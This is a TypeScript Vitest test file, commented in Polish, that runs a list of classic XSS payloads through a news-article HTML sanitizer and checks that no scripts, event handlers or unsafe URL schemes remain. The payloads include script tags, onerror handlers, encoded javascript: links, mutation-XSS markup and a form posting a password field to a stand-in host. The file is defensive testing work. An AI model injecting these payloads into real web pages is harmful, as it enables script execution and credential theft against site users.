// @vitest-environment jsdom
/**
 * Wektory XSS na granicy bezpieczeństwa.
 *
 * `extract.test.ts` sprawdza, że sanityzacja przepuszcza to, co ma przepuścić.
 * Ten plik robi drugą połowę roboty: bierze zestaw klasycznych ładunków i
 * pilnuje, żeby ani jeden nie wyszedł po drugiej stronie. To jedyne miejsce,
 * gdzie cudzy HTML wchodzi do naszego origin (CLAUDE.md 3), więc lista rośnie
 * przy każdym nowym pomyśle, a nie przy każdym zgłoszonym błędzie.
 *
 * Asercje idą po DOM-ie, nie po stringu: liczy się to, co powstanie w drzewie
 * po `append()`, a nie to, jak wygląda tekst HTML-a.
 */
import { describe, expect, it } from 'vitest';

import { sanitizeArticleHtml, sanitizeToFragment } from './sanitize';

const BASE = 'https://gazeta.example/dzial/artykul';

/** Schematy, które wolno zobaczyć w gotowym drzewie. */
const SAFE_SCHEME = /^(https?:|data:image\/)/;

interface Findings {
  tags: string[];
  eventAttrs: string[];
  urls: string[];
}

/** Zbiera z fragmentu wszystko, co mogłoby coś wykonać. */
function scan(html: string): Findings {
  const fragment = sanitizeToFragment(html, BASE);
  const host = document.createElement('div');
  host.append(fragment);

  const findings: Findings = { tags: [], eventAttrs: [], urls: [] };

  for (const element of host.querySelectorAll('*')) {
    findings.tags.push(element.tagName.toLowerCase());

    for (const attribute of element.attributes) {
      const name = attribute.name.toLowerCase();
      if (name.startsWith('on')) findings.eventAttrs.push(`${element.tagName}:${name}`);
      if (name === 'href' || name === 'src' || name === 'srcset' || name === 'data') {
        findings.urls.push(attribute.value);
      }
    }
  }

  return findings;
}

/** Wspólny werdykt: żadnych skryptów, handlerów ani dziwnych schematów. */
function expectHarmless(html: string): Findings {
  const findings = scan(html);

  expect(findings.eventAttrs).toEqual([]);
  for (const tag of findings.tags) {
    expect(['script', 'iframe', 'object', 'embed', 'form', 'input', 'style', 'link', 'base', 'meta', 'svg', 'math', 'noscript', 'template']).not.toContain(tag);
  }
  for (const url of findings.urls) {
    expect(url).toMatch(SAFE_SCHEME);
  }

  return findings;
}

const VECTORS: readonly { name: string; payload: string }[] = [
  { name: 'zwykły script', payload: '<script>alert(1)</script><p>tekst</p>' },
  { name: 'script w zagnieżdżeniu', payload: '<div><p>a</p><script src="https://zle.example/x.js"></script></div>' },
  { name: 'rozcięty tag script', payload: '<scr<script>ipt>alert(1)</scr</script>ipt>' },
  { name: 'img onerror', payload: '<img src="x" onerror="alert(1)" alt="x" />' },
  { name: 'img onerror bez cudzysłowów', payload: '<img src=x onerror=alert(1)>' },
  { name: 'svg onload', payload: '<svg onload="alert(1)"><circle r="10"/></svg>' },
  { name: 'svg z animate i href', payload: '<svg><a href="javascript:alert(1)"><text>klik</text></a></svg>' },
  { name: 'body onload przemycone w treści', payload: '<body onload="alert(1)"><p>tekst</p></body>' },
  { name: 'link javascript:', payload: '<a href="javascript:alert(1)">klik</a>' },
  { name: 'link javascript: z wielkich liter', payload: '<a href="JaVaScRiPt:alert(1)">klik</a>' },
  { name: 'link javascript: z białymi znakami', payload: '<a href=" \t\njavascript:alert(1)">klik</a>' },
  { name: 'link javascript: z encjami', payload: '<a href="&#106;avascript&colon;alert(1)">klik</a>' },
  { name: 'link data:text/html', payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">klik</a>' },
  { name: 'img data:text/html', payload: '<img src="data:text/html,<script>alert(1)</script>" alt="x" />' },
  { name: 'vbscript:', payload: '<a href="vbscript:msgbox(1)">klik</a>' },
  { name: 'iframe srcdoc', payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>' },
  { name: 'object i embed', payload: '<object data="zly.swf"></object><embed src="zly.swf">' },
  { name: 'meta refresh', payload: '<meta http-equiv="refresh" content="0;url=https://zle.example">' },
  { name: 'base href', payload: '<base href="https://zle.example/"><a href="/konto">klik</a>' },
  { name: 'formularz z akcją', payload: '<form action="https://zle.example/kradnij"><input name="haslo"><button>OK</button></form>' },
  { name: 'style i wyrażenie w atrybucie', payload: '<style>@import url(https://zle.example/x.css)</style><p style="background:url(javascript:alert(1))">tekst</p>' },
  { name: 'autofocus onfocus', payload: '<input autofocus onfocus="alert(1)">' },
  { name: 'details ontoggle', payload: '<details ontoggle="alert(1)" open><summary>a</summary>b</details>' },
  { name: 'srcset obok src', payload: '<img src="https://cdn.example/a.png" srcset="javascript:alert(1) 1x" alt="a" />' },
  { name: 'template ze skryptem', payload: '<template><script>alert(1)</script></template><p>tekst</p>' },
  { name: 'noscript', payload: '<noscript><p>bez js</p></noscript>' },
  { name: 'math z płótnem', payload: '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></mtext></math>' },
  { name: 'komentarz warunkowy', payload: '<!--[if IE]><script>alert(1)</script><![endif]--><p>tekst</p>' },
  { name: 'atrybut z podwójnym kodowaniem', payload: '<a href="%6a%61%76%61%73%63%72%69%70%74:alert(1)">klik</a>' },
];

describe('wektory XSS', () => {
  for (const vector of VECTORS) {
    it(`nie przepuszcza: ${vector.name}`, () => {
      expectHarmless(vector.payload);

      // Ta sama treść drugą ścieżką - stringową, używaną przy zapisie do bazy.
      const clean = sanitizeArticleHtml(vector.payload, BASE).html.toLowerCase();
      expect(clean).not.toContain('<script');
      expect(clean).not.toContain('javascript:');
      expect(clean).not.toContain('vbscript:');
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('onload');
      expect(clean).not.toContain('srcdoc');
    });
  }
});

describe('co po sanityzacji zostaje', () => {
  it('sam tekst ładunku, bez znaczników wykonawczych', () => {
    const findings = scan('<p>przed</p><script>alert(1)</script><p>po</p>');
    expect(findings.tags).toEqual(['p', 'p']);
  });

  it('obrazek data: przechodzi tylko jako obrazek', () => {
    const pixel =
      'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
    const findings = scan(`<img src="${pixel}" alt="piksel" /><a href="${pixel}">klik</a>`);

    expect(findings.urls).toEqual([pixel]);
    // Link zostaje, ale bez adresu - nie ma dokąd kliknąć.
    expect(findings.tags).toEqual(['img', 'a']);
  });

  it('link o wyciętym adresie nie udaje działającego', () => {
    const fragment = sanitizeToFragment('<a href="javascript:alert(1)">klik</a>', BASE);
    const host = document.createElement('div');
    host.append(fragment);

    const link = host.querySelector('a');
    expect(link?.hasAttribute('href')).toBe(false);
    expect(link?.textContent).toBe('klik');
  });

  it('obrazek o wyciętym adresie znika razem z ramką', () => {
    const findings = scan('<p>a</p><img src="ftp://serwer/x.png" alt="x" />');
    expect(findings.tags).toEqual(['p']);
  });
});
